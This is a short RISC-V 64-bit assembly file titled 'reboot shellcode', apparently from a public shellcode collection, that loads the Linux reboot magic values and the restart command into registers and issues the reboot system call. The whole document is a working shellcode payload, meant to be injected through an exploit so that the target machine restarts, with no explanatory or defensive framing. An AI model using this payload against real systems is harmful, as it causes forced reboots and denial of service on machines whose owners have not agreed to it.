# RISC-V 64-bit reboot shellcode
# ---
# bcoles

.global _start
.section .text

_start:
  li a0, 0xfee1dead   # magic1
  li a1, 0x28121969   # magic2
  li a2, 0x01234567   # LINUX_REBOOT_CMD_RESTART
  li a7, 142          # reboot
  ecall
